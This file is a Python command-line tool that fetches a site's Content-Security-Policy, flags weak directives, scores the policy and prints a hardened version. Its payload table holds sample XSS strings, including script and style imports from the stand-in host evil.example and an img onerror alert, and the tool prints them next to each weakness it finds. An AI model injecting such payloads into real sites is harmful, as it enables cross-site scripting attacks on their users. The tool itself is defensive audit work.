#!/usr/bin/env python3
import argparse
import sys
import requests

# Payloads
PAYLOADS = {
    "script-src": "<script src=https://evil.example/x.js></script>",
    "img-src": "<img src=x onerror=alert(1)>",
    "style-src": "<style>@import 'https://evil.example/x.css'</style>"
}

# CSP parsing
def parse_csp(csp):
    policy = {}
    for part in csp.split(";"):
        part = part.strip()
        if not part:
            continue
        t = part.split()
        policy[t[0].lower()] = t[1:]
    return policy

# Fetch CSP
def fetch_csp(url):
    try:
        r = requests.get(url, timeout=10)
        return r.headers.get("Content-Security-Policy")
    except Exception:
        return None

# Analyzer (NO NOISE)
def analyze(policy):
    vulns = []

    if policy.get("default-src") == ["*"]:
        vulns.append(("default-src", "Wildcard allows all origins"))

    if "script-src" in policy:
        if "'unsafe-inline'" in policy["script-src"]:
            vulns.append(("script-src", "unsafe-inline allowed"))
        if "*" in policy["script-src"]:
            vulns.append(("script-src", "Wildcard script execution"))

    return vulns

# CSP Score
def score(policy):
    s = 100
    if policy.get("default-src") == ["*"]:
        s -= 30
    if "script-src" in policy:
        if "'unsafe-inline'" in policy["script-src"]:
            s -= 25
        if "*" in policy["script-src"]:
            s -= 25
    if "object-src" not in policy:
        s -= 10
    if "base-uri" not in policy:
        s -= 5
    if "frame-ancestors" not in policy:
        s -= 5
    return max(s, 0)

# Harden CSP
def harden(policy):
    hardened = {}
    suggestions = []
    removed = []
    added = []

    hardened["default-src"] = ["'none'"]
    if policy.get("default-src") == ["*"]:
        removed.append("default-src *")

    scripts = ["'self'", "'nonce-{NONCE}'", "'strict-dynamic'"]
    for v in policy.get("script-src", []):
        if v == "'unsafe-inline'":
            removed.append("script-src 'unsafe-inline'")
        elif not v.startswith("'"):
            scripts.append(v)
    hardened["script-src"] = sorted(set(scripts))

    baseline = {
        "style-src": ["'self'", "'nonce-{NONCE}'"],
        "img-src": ["'self'", "data:"],
        "font-src": ["'self'"],
        "connect-src": ["'self'"],
        "media-src": ["'self'"],
        "worker-src": ["'self'"],
        "manifest-src": ["'self'"],
        "object-src": ["'none'"],
        "base-uri": ["'none'"],
        "form-action": ["'self'"],
        "frame-ancestors": ["'none'"],
        "upgrade-insecure-requests": [],
        "block-all-mixed-content": [],
        "require-trusted-types-for": ["'script'"],
        "trusted-types": ["default"]
    }

    for d, v in baseline.items():
        if d not in policy:
            added.append(d)
        hardened[d] = v

    if removed:
        suggestions.append(
            "Removed insecure directives: " + ", ".join(removed)
        )

    if added:
        suggestions.append(
            "Added missing directives: " + ", ".join(added)
        )

    if "script-src" in policy and any("maps.googleapis.com" in x for x in policy["script-src"]):
        suggestions.append(
            "Preserved risky domain https://maps.googleapis.com (consider removal for zero findings)"
        )

    return hardened, suggestions

# Render CSP
def render(policy):
    return "\n".join(
        d + (" " + " ".join(v) if v else "") + ";"
        for d, v in policy.items()
    )

# Main processor
def process(csp, source, args):
    policy = parse_csp(csp)
    vulns = analyze(policy)
    sc = score(policy)
    hardened, suggestions = harden(policy)

    only_specific = args.vuln or args.score or args.harden

    print(f"\n[+] Target: {source}")

    if args.score or not only_specific:
        print(f"Score: {sc}/100")

    if args.vuln or not only_specific:
        print("\nVulnerable directives:")
        if vulns:
            for d, m in vulns:
                print(f"- {d}: {m}")
                if d in PAYLOADS:
                    print(f"  Payload: {PAYLOADS[d]}")
        else:
            print("None")

    if args.harden or not only_specific:
        hcsp = render(hardened)
        print("\nHardened CSP:\n" + hcsp)

        if not args.harden:
            print("\nSuggestions:")
            for i, s in enumerate(suggestions, 1):
                print(f"{i}. {s}")

    if args.output:
        with open(args.output, "w") as f:
            f.write(render(hardened))

# CLI
def main():
    ap = argparse.ArgumentParser(
        description="CSP Validator — exploit detection & OWASP hardening"
    )
    ap.add_argument("-u", "--url")
    ap.add_argument("-f", "--file")
    ap.add_argument("-s", "--string")
    ap.add_argument("-o", "--output", help="Save hardened CSP only")
    ap.add_argument("-score", action="store_true")
    ap.add_argument("-vuln", action="store_true")
    ap.add_argument("-harden", action="store_true")
    args = ap.parse_args()

    if not any([args.url, args.file, args.string]) and sys.stdin.isatty():
        ap.print_help()
        sys.exit(0)

    if args.url:
        url = args.url if args.url.startswith("http") else "https://" + args.url
        csp = fetch_csp(url)
        if csp:
            process(csp, url, args)
        return

    if args.file:
        with open(args.file) as f:
            for line in f:
                url = line.strip()
                if not url:
                    continue
                url = url if url.startswith("http") else "https://" + url
                csp = fetch_csp(url)
                if csp:
                    process(csp, url, args)
        return

    if args.string:
        if args.string.strip().startswith("default-src"):
            process(args.string, "inline-csp", args)
        else:
            with open(args.string) as f:
                process(f.read(), args.string, args)
        return

    data = sys.stdin.read().strip()
    if data:
        process(data, "stdin", args)

if __name__ == "__main__":
    main()
